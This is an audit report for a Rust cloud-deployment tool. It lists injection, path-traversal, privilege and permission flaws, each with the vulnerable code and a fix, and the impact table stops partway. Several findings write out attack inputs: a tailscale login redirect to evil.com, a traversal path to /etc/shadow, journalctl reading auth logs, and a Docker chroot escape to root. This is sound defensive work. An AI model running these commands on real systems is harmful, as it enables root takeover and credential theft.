# Security Flaw Evaluation Report

**Project:** ClawMacToDO
**Date:** 2026-03-14
**Last Updated:** 2026-03-22
**Auditor:** GitHub Copilot (automated static analysis)
**Scope:** Full Rust codebase (`crates/`), shell scripts (`scripts/`), and web server (`web/`)

---

## Summary

| Severity | Count | Fixed | Remaining |
|----------|-------|-------|-----------|
| CRITICAL | 4     | 4     | 0         |
| HIGH     | 12    | 12    | 0         |
| MEDIUM   | 6     | 0     | 6         |
| LOW      | 8     | 0     | 8         |
| **Total** | **30** | **16** | **14**   |

---

## Remediation Status (as of security-flaw branch)

| ID | Severity | Status | Fix Description |
|----|----------|--------|-----------------|
| CRIT-01 | CRITICAL | **FIXED in v0.17.0** | API key auth, 6-digit PIN login, CORS, rate limiting, localhost-only binding |
| CRIT-02 | CRITICAL | **FIXED in v0.16.0** | SSH host key verification via TOFU with `~/.clawmacdo/known_hosts` |
| CRIT-03 | CRITICAL | **FIXED in v0.16.0** | `.env` file written via SCP binary transfer instead of shell heredoc |
| CRIT-04 | CRITICAL | **FIXED in v0.16.0** | `PermitRootLogin prohibit-password` in cloud-init + post-provision enforcement |
| HIGH-01 | HIGH | **FIXED on security-flaw branch** | Privileged SSH execution now uses stdin-fed shells instead of nested shell escaping |
| HIGH-02 | HIGH | **FIXED on security-flaw branch** | Hostnames are normalized and validated centrally before deploy |
| HIGH-03 | HIGH | **FIXED on security-flaw branch** | Secrets removed from `openclaw onboard` command-line arguments |
| HIGH-04 | HIGH | **FIXED on security-flaw branch** | Backup archives validated locally and restored with safer tar flags |
| HIGH-05 | HIGH | **FIXED on security-flaw branch** | `openclaw` no longer gets Docker-group access; sandbox forced off as secure default |
| HIGH-06 | HIGH | **FIXED on security-flaw branch** | Sudoers rules narrowed to exact low-risk commands |
| HIGH-07 | HIGH | **FIXED on security-flaw branch** | Web backup path canonicalized under `~/.clawmacdo/backups` |
| HIGH-08 | HIGH | **FIXED on security-flaw branch** | Web SSH key path canonicalized under `~/.clawmacdo/keys` |
| HIGH-09 | HIGH | **FIXED on security-flaw branch** | Gateway service now reads a scoped `gateway.env` instead of `.env` |
| HIGH-10 | HIGH | **FIXED on security-flaw branch** | Public IP and DB mutex unwraps replaced with explicit error handling |
| HIGH-11 | HIGH | **FIXED on security-flaw branch** | Lightsail credentials now stay scoped to explicit provider instances |
| HIGH-12 | HIGH | **FIXED on security-flaw branch** | Tencent SSH ingress now uses a constrained CIDR instead of `0.0.0.0/0` |
| MED-01 | MEDIUM | OPEN | Lightsail tags still use format!() |
| MED-02 | MEDIUM | OPEN | IP field not validated in HTTP requests |
| MED-03 | MEDIUM | OPEN | gen_apikey.sh shell-to-Python injection |
| MED-04 | MEDIUM | OPEN | security_api.js predictable paths |
| MED-05 | MEDIUM | OPEN | Public key written via shell interpolation |
| MED-06 | MEDIUM | OPEN | scan.rs expect() panics |
| LOW-01 | LOW | OPEN | SCP uploads still use 0o644 |
| LOW-02 | LOW | OPEN | SSH key permissions not set on Windows |
| LOW-03 | LOW | OPEN | curl \| bash without integrity check |
| LOW-04 | LOW | OPEN | SQLite database uses default permissions |
| LOW-05 | LOW | OPEN | Deploy record JSON uses default permissions |
| LOW-06 | LOW | OPEN | Tailwind CDN loaded without SRI |
| LOW-07 | LOW | OPEN | Error messages leak internal state |
| LOW-08 | LOW | OPEN | Symlink-following in extension copy |

---

## Implementation Notes

The detailed code-to-fix mapping for the HIGH findings now lives in [docs/HIGH_SECURITY_FIXES.md](docs/HIGH_SECURITY_FIXES.md). That document records the exact files changed, why each remediation was chosen, and where behavior changed intentionally.

---

## CRITICAL

### CRIT-01: Web server has zero authentication — FIXED in v0.17.0

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Lines** | 230–248 |
| **Function** | `run()` |
| **CWE** | CWE-306 (Missing Authentication for Critical Function) |
| **Status** | **FIXED** |

**Description:**
The Axum server binds to `0.0.0.0` (all interfaces) with no authentication, no CORS, and no rate limiting on any endpoint.

**Fix Applied (4 layers of protection):**
1. **API key authentication** — All `/api/*` endpoints require `X-API-Key` header matching `CLAWMACDO_API_KEY` env var. Returns 401 if invalid/missing. If env var is unset, auth is bypassed (dev mode).
2. **6-digit PIN login for web pages** — Web UI pages (`/`, `/assets/*`) require session cookie. Users must enter a 6-digit PIN (from `CLAWMACDO_PIN` env var) at `/login` page. Session cookie is `HttpOnly; SameSite=Strict; Max-Age=86400`. If env var is unset, PIN is bypassed (dev mode).
3. **CORS middleware** — `tower-http` CorsLayer restricts `Access-Control-Allow-Origin` to `http://localhost:{port}`. Only `GET`, `POST`, `DELETE` methods allowed. Only `Content-Type` and `X-API-Key` headers allowed.
4. **Rate limiting** — In-memory per-IP rate limiter: 60 requests per 60-second window. Returns `429 Too Many Requests` when exceeded.
5. **Localhost-only binding** — Server binds to `127.0.0.1` by default (not `0.0.0.0`). Set `CLAWMACDO_BIND=0.0.0.0` to allow remote access.

**Environment variables:**
| Variable | Purpose | Default |
|----------|---------|---------|
| `CLAWMACDO_API_KEY` | API key for `/api/*` endpoints | (none — auth disabled) |
| `CLAWMACDO_PIN` | 6-digit PIN for web UI login | (none — PIN disabled) |
| `CLAWMACDO_BIND` | Server bind address | `127.0.0.1` |

---

### CRIT-02: No SSH host key verification (MITM) — FIXED in v0.16.0

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-ssh/src/ssh.rs` |
| **Lines** | 64–87 |
| **Function** | `connect_as()` |
| **CWE** | CWE-295 (Improper Certificate Validation) |
| **Status** | **FIXED** |

**Description:**
The SSH `connect_as()` function establishes TCP, performs handshake, and authenticates without ever verifying the remote host's key against a known_hosts file. Every SSH connection in the application goes through this function.

**Fix Applied:**
Implemented Trust On First Use (TOFU) host key verification:
- `load_known_hosts()` reads SSH host keys from `~/.clawmacdo/known_hosts`
- `save_known_host()` saves new host keys on first connection
- `verify_host_key()` verifies host key matches known entry before authentication is sent
- Host key extracted via `sess.host_key()` and base64-encoded for storage/comparison
- Mismatches return `AppError::HostKeyMismatch` with actionable error message including IP, expected, and actual key values
- Verification occurs **before** `userauth_pubkey_file()` — credentials are never sent to an unverified host

---

### CRIT-03: API keys interpolated into shell heredoc — command injection — FIXED in v0.16.0

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/openclaw.rs` |
| **Lines** | 35–48 |
| **Function** | `provision()` |
| **CWE** | CWE-78 (OS Command Injection) |
| **Status** | **FIXED** |

**Description:**
User-supplied API keys are string-interpolated into a heredoc sent over SSH. Although the heredoc delimiter `'ENVEOF'` is quoted (disabling `$` expansion), if any key value contains a line consisting solely of the string `ENVEOF`, the heredoc terminates early and all subsequent content is interpreted as shell commands running as root.

**Fix Applied:**
The `.env` file is now written via `ssh::scp_upload_bytes()` instead of shell heredoc:
- API keys are assembled into a string in Rust, converted to raw bytes
- Uploaded via SCP binary transfer to `/tmp/.env_upload` with mode `0o600`
- Moved to final location with `mv` command + `chmod 600` + `chown openclaw:openclaw`
- Keys never enter a shell command string, completely eliminating heredoc delimiter injection and shell escaping issues

---

### CRIT-04: Cloud-init forces `PermitRootLogin yes` permanently — FIXED in v0.16.0

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cloud/src/cloud_init.rs` |
| **Lines** | 49–54 (YAML), 100–105 (shell) |
| **Function** | `generate()`, `generate_shell()` |
| **CWE** | CWE-250 (Execution with Unnecessary Privileges) |
| **Status** | **FIXED** |

**Description:**
Both cloud-init variants force-enable root SSH login and are never reverted after provisioning completes.

**Fix Applied (defense-in-depth):**
1. **Cloud-init now sets secure default:** `PermitRootLogin prohibit-password` instead of `yes` — allows pubkey-only root login (no password auth) during initial provisioning
2. **Post-provisioning hardening enforcement** in `provision/mod.rs`: After all provisioning steps complete, explicitly converts any remaining `PermitRootLogin yes` to `prohibit-password`, applies to both main config and `.d/` fragments, and restarts sshd to apply changes immediately
3. Defense-in-depth: cloud-init sets the baseline, post-provision enforcement ensures it wasn't accidentally modified during provisioning

---

## HIGH

### HIGH-01: `ssh_root_as` shell escaping is insufficient for nested contexts

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/commands.rs` |
| **Lines** | 15–22 |
| **Function** | `ssh_root_as()` |
| **CWE** | CWE-78 (OS Command Injection) |

**Affected code (lines 19–21):**
```rust
let escaped = cmd.replace('\'', "'\\''");
let sudo_cmd = format!("sudo bash -c '{escaped}'");
ssh::exec_as(ip, key, &sudo_cmd, ssh_user)
```

**Also in `ssh_as_openclaw` (lines 55–57) and `ssh_as_openclaw_with_user` (lines 66–74):**
```rust
fn shell_escape(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}
```

**Issue:**  
Commands flow through multiple escaping layers: `cmd` → `sudo bash -c '...'` → and separately → `su - openclaw -c '...'`. This nested quoting is fragile. Null bytes, control characters, or carefully crafted sequences can bypass single-quote escaping. The `cmd` values come from `format!()` strings containing user inputs (API keys, hostnames, phone numbers).

**Recommendation:**  
Use a proper shell-escaping library. Consider SCP-based file transfer for configuration data instead of piping values through shell commands.

---

### HIGH-02: Hostname injected unsanitized into shell commands

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | Multiple (537, 547, 787, 796, 1093, 1124) |
| **Functions** | `deploy_steps_5_through_16()`, `run_tencent()`, `run_lightsail()` |
| **CWE** | CWE-78 (OS Command Injection) |

**Description:**  
The `hostname` variable (user-supplied via CLI `--hostname` flag or HTTP `hostname` field) is interpolated directly into large SSH shell command strings without any validation or escaping.

**Example (line 537 — DO path):**
```rust
let start_cmd = format!(
    "export PATH=\"{home}/.local/bin:...\" && \
     ...
     (openclaw onboard --non-interactive --mode local ...
```

The `hostname` is also used in Tailscale commands (handled by `shell_quote` in `tailscale.rs` — safe there) but is **not** escaped in the deploy command strings, `build_model_setup_cmd()`, or `build_profile_setup_cmd()`.

**Recommendation:**  
Validate hostname against a strict regex (e.g., `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`) at the entry point (CLI parsing and HTTP deserialization).

---

### HIGH-03: Secrets exposed in process command line (`/proc/pid/cmdline`)

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | 537, 787, 1093 |
| **CWE** | CWE-214 (Invocation of Process Using Visible Sensitive Information) |

**Affected code (line 537):**
```rust
(openclaw onboard --non-interactive --mode local \
  --auth-choice apiKey --anthropic-api-key "$ANTHROPIC_API_KEY" \
  --openai-api-key "$OPENAI_API_KEY" \
  --secret-input-mode plaintext ...)
```

**Impact:**  
API keys appear in the process's command line arguments. Any user on the server can read them via `ps aux`, `cat /proc/<pid>/cmdline`, or systemd journal.

**Recommendation:**  
Pass secrets via environment variables only (not command-line args), or use stdin/file-based secret input.

---

### HIGH-04: Backup `tar xzf` as root with no path validation

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | 464, 721, 1022 |
| **CWE** | CWE-22 (Path Traversal), CWE-59 (Symlink Following) |

**Affected code (line 464 — Tencent path):**
```rust
let extract_cmd = "mkdir -p /root/.openclaw && cd /tmp && tar xzf openclaw_backup.tar.gz \
  && cp -a /tmp/openclaw/* /root/.openclaw/ 2>/dev/null; \
  rm -rf /tmp/openclaw /tmp/openclaw_backup.tar.gz && echo ok";
```

**Lines 721 (DO path), 1022 (Lightsail path):** Identical pattern.

**Impact:**  
A malicious backup archive can contain path traversal (`../`) entries or symlinks pointing to sensitive system files. The `tar xzf` runs as root with no `--no-same-owner`, no path filtering, and no size limits.

**Recommendation:**  
Extract to a temporary chroot directory. Use `tar --strip-components=1 --no-same-owner` and filter out entries with `..` or absolute paths. Validate archive size before extraction.

---

### HIGH-05: Docker group membership = root equivalent

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/docker.rs` |
| **Line** | 45 |
| **Function** | `provision()` |
| **CWE** | CWE-250 (Execution with Unnecessary Privileges) |

**Affected code (line 45):**
```rust
ssh_root_as_async(
    ip,
    key,
    &format!("usermod -aG docker {OPENCLAW_USER}"),
    ssh_user,
).await?;
```

**Impact:**  
The `openclaw` user can run `docker run -v /:/host --privileged ubuntu chroot /host` to gain full root access. This renders the carefully scoped sudoers rules in `user.rs` (lines 100–118) ineffective — they become security theater.

**Recommendation:**  
Remove `openclaw` from the docker group. Use Docker socket proxying with limited capabilities, or run Docker commands via scoped sudoers rules instead.

---

### HIGH-06: Sudoers wildcard rules allow argument injection

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/user.rs` |
| **Lines** | 110, 112, 114, 115, 118 |
| **CWE** | CWE-78 (OS Command Injection) |

**Affected code (lines 110–118):**
```
{user} ALL=(ALL) NOPASSWD: /usr/bin/tailscale up *
{user} ALL=(ALL) NOPASSWD: /usr/bin/tailscale ip *
{user} ALL=(ALL) NOPASSWD: /usr/bin/tailscale ping *
{user} ALL=(ALL) NOPASSWD: /usr/bin/tailscale whois *
{user} ALL=(ALL) NOPASSWD: /usr/bin/journalctl -u openclaw *
```

**Impact:**
- `sudo tailscale up --login-server=https://evil.com` — redirect Tailscale to an attacker-controlled server
- `sudo journalctl -u openclaw --file=/var/log/auth.log` — read arbitrary log files
- `sudo journalctl -u openclaw -o export` — exfiltrate binary journal data

**Recommendation:**  
Replace wildcards with explicit allowed argument combinations. For journalctl, lock down to `--no-pager -f` only. For tailscale, specify the exact allowed flags.

---

### HIGH-07: Path traversal via `backup` field from HTTP request

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Line** | 321 |
| **Function** | `start_deploy_handler()` |
| **CWE** | CWE-22 (Path Traversal) |

**Affected code (line 321):**
```rust
let backup: Option<PathBuf> = if req.backup.is_empty() || req.backup == "none" {
    None
} else {
    Some(PathBuf::from(&req.backup))  // ← No validation
};
```

**Data flow:**  
HTTP POST body → `req.backup` → `PathBuf` → passed to `scp_upload()` → reads the file from disk and uploads it to the remote server.

**Impact:**  
An attacker can specify `../../../../etc/shadow` or any absolute path as the backup and exfiltrate any file the process can read.

**Recommendation:**  
Canonicalize the path and verify it starts with the backups directory (`~/.clawmacdo/backups/`). Reject absolute paths and paths containing `..`.

---

### HIGH-08: Arbitrary filesystem access via `ssh_key_path` from HTTP request

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Lines** | 547, 596, 659, 707 |
| **Functions** | `approve_telegram_pairing_handler()`, `fetch_whatsapp_qr_handler()`, `repair_whatsapp_handler()`, `repair_agent_docker_handler()` |
| **CWE** | CWE-22 (Path Traversal) |

**Affected code (line 547 example):**
```rust
let key = PathBuf::from(key_path);
```

**All four instances:**  
Line 547, 596, 659, 707 — `PathBuf::from(key_path)` where `key_path` comes directly from the HTTP request body.

**Impact:**  
An attacker can point this at any file on the host filesystem. The file is passed to `ssh2::Session::userauth_pubkey_file()` which reads it.

**Recommendation:**  
Validate that `ssh_key_path` exists within `~/.clawmacdo/keys/` before using it.

---

### HIGH-09: `EnvironmentFile` leaks all API keys to every child process

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/openclaw.rs` |
| **Lines** | 35–48 (writes `.env`) |
| **Also** | `crates/clawmacdo-cli/src/commands/deploy.rs` lines 537, 787, 1093 (`EnvironmentFile=-{home}/.openclaw/.env` in systemd unit) |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) |

**Description:**  
The `.env` file has correct permissions (`chmod 600`), but it is loaded as `EnvironmentFile` by the systemd user service. All API keys (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `TELEGRAM_BOT_TOKEN`) are injected into the process environment. Any code-execution vulnerability in openclaw or its npm dependencies trivially leaks every key.

**Recommendation:**  
Use a secrets manager or OS keyring. At minimum, only pass the keys actually needed by the gateway process.

---

### HIGH-10: `unwrap()` on untrusted cloud API data — panics/DoS

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | 421, 682 |
| **Also** | `crates/clawmacdo-cli/src/commands/serve.rs` lines 756, 783 |
| **CWE** | CWE-248 (Uncaught Exception) |

**Affected code:**
```rust
// deploy.rs:421 (Tencent path)
let ip = instance.public_ip.unwrap();

// deploy.rs:682 (DigitalOcean path)
let ip = droplet.public_ip().unwrap();

// serve.rs:756, 783 (web server)
let conn = state.db.lock().unwrap();
```

**Impact:**  
If a cloud API returns an instance without a public IP, the entire process panics. In the web server context, a poisoned Mutex (from a prior panic) permanently crashes the server on subsequent requests.

**Recommendation:**  
Replace `unwrap()` with proper error handling (`.context("...")? ` or `ok_or_else(|| ...)?`).

---

### HIGH-11: AWS credentials set as global env vars (thread-unsafe)

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | 895–897 |
| **Function** | `run_lightsail()` |
| **CWE** | CWE-362 (Race Condition), CWE-667 (Improper Locking) |

**Affected code (lines 895–897):**
```rust
env::set_var("AWS_ACCESS_KEY_ID", &params.aws_access_key_id);
env::set_var("AWS_SECRET_ACCESS_KEY", &params.aws_secret_access_key);
env::set_var("AWS_DEFAULT_REGION", &params.aws_region);
```

**Impact:**  
`env::set_var` is process-global and is **unsound** in multi-threaded Rust (since Rust 1.66). In the web server, concurrent Lightsail deploys race on these globals. Credentials leak to every child process spawned by any thread.

**Recommendation:**  
Pass AWS credentials via `Command::env()` method on each subprocess invocation instead of global environment variables.

---

### HIGH-12: Tencent security group opens SSH to `0.0.0.0/0`

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cloud/src/tencent.rs` |
| **Lines** | 428–435 |
| **Function** | `create_security_group()` |
| **CWE** | CWE-284 (Improper Access Control) |

**Affected code (lines 428–435):**
```rust
{
    "Protocol": "TCP",
    "Port": "22",
    "CidrBlock": "0.0.0.0/0",
    "Action": "ACCEPT",
    "PolicyDescription": "SSH"
},
```

**Impact:**  
SSH port is open to the entire internet on every Tencent-provisioned instance. Combined with CRIT-04 (`PermitRootLogin yes`), this maximizes the attack surface.

**Recommendation:**  
Restrict SSH to the deployer's IP or a VPN/Tailscale CIDR block. Add the deployer's IP dynamically during provisioning.

---

## MEDIUM

### MED-01: Lightsail tags built via string interpolation (JSON injection)

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cloud/src/lightsail_cli.rs` |
| **Lines** | 210–211 |
| **CWE** | CWE-94 (Code Injection) |

**Affected code (lines 210–211):**
```rust
let tags_json = format!(
    r#"[{{"key":"openclaw","value":"true"}},{{"key":"customer_email","value":"{}"}}"#,
    params.customer_email
);
```

**Impact:**  
A `customer_email` containing `"` or `}` breaks the JSON and injects additional tag key-value pairs.

**Recommendation:**  
Use `serde_json::to_string()` for JSON construction instead of `format!()`.

---

### MED-02: SSRF via unvalidated `ip` field in HTTP requests

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Lines** | 530–535, 594, 657, 705 |
| **CWE** | CWE-918 (Server-Side Request Forgery) |

**Description:**  
The `ip` field from HTTP request bodies (`TelegramPairingApproveRequest`, `WhatsAppQrRequest`, `DockerFixRequest`) is only checked for `is_empty()`. No validation that it is a legitimate IP address. The value is used to establish SSH connections.

**Impact:**  
An attacker can supply an internal hostname (e.g., `internal-k8s.local`, `169.254.169.254`) and the server will attempt SSH connections to internal infrastructure (SSRF via SSH).

**Recommendation:**  
Validate the `ip` field as a proper IP address. Block private/link-local ranges. Optionally, only allow IPs of known deployments from the database.

---

### MED-03: `gen_apikey.sh` — shell-to-Python variable injection

| Field | Value |
|-------|-------|
| **File** | `scripts/gen_apikey.sh` |
| **Lines** | 10–12 |
| **CWE** | CWE-94 (Code Injection) |

**Affected code (lines 10–12):**
```bash
key='$key'
name='$name'
db='$db'
```

**Impact:**  
If `$name` (first argument) contains a single quote, it escapes the Python string literal and allows arbitrary Python code execution.

**Recommendation:**  
Use `sys.argv` to pass parameters to the Python script instead of shell variable interpolation.

---

### MED-04: `security_api.js` — predictable paths, no body validation

| Field | Value |
|-------|-------|
| **File** | `web/server/security_api.js` |
| **Lines** | 30–36, 41–43 |
| **CWE** | CWE-377 (Insecure Temporary File), CWE-20 (Improper Input Validation) |

**Affected code (lines 30–36):**
```javascript
app.post('/api/security/scan', (req, res) => {
    const id = String(idCounter++);
    const ts = Date.now();
    const out = `/tmp/openclaw_security_scan_${ts}.json`;
    // ...
    const child = spawn('/bin/bash', ['scripts/run_all_scans.sh'], {cwd: ROOT});
});
```

**Line 43:**
```javascript
res.sendFile(j.out);  // Path derived from Date.now() — predictable
```

**Impact:**  
Race condition on the output file. An attacker who can predict the timestamp creates a symlink at the target path before the scan runs, hijacking the output or reading arbitrary files via `sendFile`.

**Recommendation:**  
Use `mktemp` or `crypto.randomUUID()` for output paths. Validate `j.out` is within an allowed directory before calling `sendFile`.

---

### MED-05: Public key written via unquoted interpolation in shell

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-provision/src/provision/user.rs` |
| **Line** | 135 |
| **Function** | `provision()` |
| **CWE** | CWE-78 (OS Command Injection) |

**Affected code (line 135):**
```rust
echo '{pubkey}' > {home}/.ssh/authorized_keys && \
```

**Description:**  
The public key is embedded in a single-quoted shell string. If the generated public key content were to contain a single quote (unlikely for standard SSH keys but possible if the file is tampered), it would break the shell command.

**Recommendation:**  
Use SCP to upload the authorized_keys file instead of shell echo, or base64-encode the key and decode on the server.

---

### MED-06: `scan.rs` — `expect()` panics on process spawn failures

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/bin/scan.rs` |
| **Lines** | 27, 35, 43, 51, 58, 70 |
| **CWE** | CWE-248 (Uncaught Exception) |

**Affected code (line 27 as example):**
```rust
let status = Command::new("/bin/bash")
    .arg("scripts/ubuntu_scan.sh")
    .arg(&out)
    .status()
    .expect("failed");
```

**Six** `.expect("failed")` calls — all panic if the bash script cannot be spawned.

**Recommendation:**  
Replace `.expect()` with proper error handling using `match` or `?`.

---

## LOW

### LOW-01: SCP uploads use world-readable `0o644`

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-ssh/src/ssh.rs` |
| **Lines** | 176, 216 |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Affected code (line 176):**
```rust
.scp_send(Path::new(remote_path), 0o644, file_size, None)
```

**Impact:**  
Backup archives (which may contain credentials) are uploaded as world-readable files on the remote server.

**Recommendation:**  
Use `0o600` for sensitive files like backup archives.

---

### LOW-02: SSH private key permissions not set on Windows

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-ssh/src/ssh.rs` |
| **Lines** | 46–52 |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Affected code (lines 46–52):**
```rust
#[cfg(unix)]
{
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&private_path, std::fs::Permissions::from_mode(0o600))?;
}
```

**Impact:**  
On Windows, the private key file retains default permissions (potentially world-readable).

**Recommendation:**  
Use Windows ACL APIs to restrict the key file to the current user only.

---

### LOW-03: `curl | bash` for NodeSource and AWS CLI

| Field | Value |
|-------|-------|
| **Files** | `crates/clawmacdo-cloud/src/cloud_init.rs` (line 41), `crates/clawmacdo-cloud/src/lightsail_cli.rs` (lines 31–38) |
| **CWE** | CWE-494 (Download of Code Without Integrity Check) |

**cloud_init.rs line 41:**
```yaml
- curl -fsSL https://deb.nodesource.com/setup_24.x | bash -
```

**lightsail_cli.rs lines 31–38:**
```rust
Command::new("sh")
    .args(["-c",
        "curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip \
         && unzip -qo /tmp/awscliv2.zip -d /tmp \
         && sudo /tmp/aws/install --update ..."])
```

**Impact:**  
If the remote URL is compromised, arbitrary code runs as root during provisioning.

**Recommendation:**  
Pin to a specific version and verify checksums, or use distro-packaged versions.

---

### LOW-04: SQLite database created with default OS permissions

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-db/src/db.rs` |
| **Line** | 17 |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Affected code (line 17):**
```rust
let conn = Connection::open(&path)
    .with_context(|| format!("Failed to open SQLite database at {}", path.display()))?;
```

**Impact:**  
`~/.clawmacdo/deployments.db` contains customer names, emails, IP addresses, and deployment status. Default permissions may be world-readable.

**Recommendation:**  
Set file permissions to `0o600` after creation.

---

### LOW-05: Deploy record JSON files use default permissions

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-core/src/config.rs` |
| **Lines** | 107–112 |
| **Function** | `DeployRecord::save()` |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |

**Affected code (lines 107–112):**
```rust
pub fn save(&self) -> Result<PathBuf, AppError> {
    let path = deploys_dir()?.join(format!("{}.json", self.id));
    let json = serde_json::to_string_pretty(self)?;
    std::fs::write(&path, json)?;
    Ok(path)
}
```

**Impact:**  
JSON files contain SSH key paths, IP addresses, and cloud provider metadata. Default permissions may be world-readable.

**Recommendation:**  
Set file permissions to `0o600` after writing.

---

### LOW-06: Web UI loads Tailwind from CDN without SRI

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Line** | 862 |
| **CWE** | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |

**Affected code (line 862):**
```html
<script src="https://cdn.tailwindcss.com"></script>
```

**Impact:**  
CDN compromise = XSS on the management UI which has access to all deploy/destroy APIs.

**Recommendation:**  
Add `integrity` and `crossorigin` attributes, or bundle the CSS locally.

---

### LOW-07: Error messages in HTTP responses leak internal state

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/serve.rs` |
| **Lines** | Throughout (e.g., 731, 758, 788) |
| **CWE** | CWE-209 (Information Exposure Through Error Message) |

**Example (line 731):**
```rust
Json(DockerFixResponse {
    ok: false,
    message: format!("Failed to run Docker access repair: {e}"),
    fix_output: String::new(),
})
```

**Impact:**  
Raw SSH stderr output, filesystem paths, and infrastructure details are exposed to unauthenticated HTTP clients.

**Recommendation:**  
Return generic error messages to HTTP clients. Log detailed errors server-side only.

---

### LOW-08: Symlink-following in extension copy

| Field | Value |
|-------|-------|
| **File** | `crates/clawmacdo-cli/src/commands/deploy.rs` |
| **Lines** | 568, 796, 1124 |
| **CWE** | CWE-59 (Improper Link Resolution Before File Access) |

**Affected code (line 568):**
```bash
OC_EXT=$(find ... -path '*/openclaw/extensions' -type d 2>/dev/null | head -1); \
if [ -n "$OC_EXT" ]; then rm -rf {home}/.openclaw/bundled-extensions && \
  cp -rL "$OC_EXT" {home}/.openclaw/bundled-extensions; fi;
```

**Impact:**  
`cp -rL` follows symlinks. A malicious extension directory with symlinks to `/etc/shadow` or other sensitive files would copy those files into the openclaw config directory, making them accessible to the `openclaw` user.

**Recommendation:**  
Use `cp -r` (without `-L`) or verify that the source directory contains no symlinks before copying.

---

## Functionality Impact Assessment

This section evaluates every finding for its impact on existing functionality if the recommended fix were applied. Findings are classified as:

- **No Impact** — fix is purely additive; no existing behavior changes.
- **Low Impact** — minor behavioral change; no user-visible disruption.
- **Moderate Impact** — may require workflow adjustments, config changes, or downstream updates.
- **High Impact** — fundamentally changes a core flow; requires coordinated changes and testing.

### CRITICAL Findings

| ID | Fix Summary | Impact Level | Functionality Impact |
|----|-------------|:------------:|----------------------|
| **CRIT-01** | Add auth middleware; bind `127.0.0.1` by default | **High** | All existing HTTP clients (web UI, scripts, CI) must supply an API key or session token. Binding to `127.0.0.1` breaks remote access unless a reverse proxy or `--bind` flag is also added. The embedded HTML UI needs a login gate. Users running `cargo run -- serve` and browsing from another machine will be blocked until they configure the new auth flow. |
| **CRIT-02** | Verify SSH host key (TOFU or known_hosts) | **Moderate** | First-time deploys will need to record the host fingerprint. Re-deployments to the same IP with a rebuilt server will fail until the stored fingerprint is cleared. Adds a new `~/.clawmacdo/known_hosts` file. No change to existing SSH key generation or connection logic beyond the added check. |
| **CRIT-03** | Write `.env` via SCP instead of heredoc | **Low** | Functionally equivalent — the `.env` file still appears at `{home}/.openclaw/.env` with the same content and `0600` permissions. The provisioning step changes from one SSH command to one SCP call + one `chmod/chown` command. All downstream consumers (systemd `EnvironmentFile`, `.bashrc` sourcing) remain unchanged. |
| **CRIT-04** | Disable root login post-provisioning | **Moderate** | All subsequent SSH operations must use the `openclaw` or `ubuntu` user (already supported via the `ssh_user` parameter). The `ssh_root_as()` functions already wrap commands with `sudo` when the user is not root `(commands.rs:17–22)`. Existing repair endpoints (`docker-fix`, `whatsapp-repair`) use `ssh_user_for_provider()` which already selects the correct user. The only breaking scenario is if an operator manually SSHs as root to a server after deploy — that workflow stops working. |

### HIGH Findings

| ID | Fix Summary | Impact Level | Functionality Impact |
|----|-------------|:------------:|----------------------|
| **HIGH-01** | Use a shell-escaping library (e.g., `shell-words`) | **No Impact** | Drop-in replacement. The `shell_escape()` function and `cmd.replace('\'', "'\\''")` are replaced by a battle-tested library producing the same output for all inputs that currently pass through the system. |
| **HIGH-02** | Validate hostname at entry point | **Low** | Rejects hostnames with special characters (`!@#$`, spaces, etc.) that would already break DNS, Tailscale, and cloud provider APIs. Legitimate hostnames matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` pass through unchanged. |
| **HIGH-03** | Pass secrets via env vars instead of cmdline args | **Low** | The `.env` file is already sourced in the shell before `openclaw onboard` runs (`set -a; . {home}/.openclaw/.env; set +a`). Removing `--anthropic-api-key`, `--openai-api-key` from the command line and relying solely on the environment is already partially implemented. The key change is removing `--secret-input-mode plaintext` and ensuring `openclaw` reads keys from the environment. Requires verifying the `openclaw` CLI supports env-only key intake. |
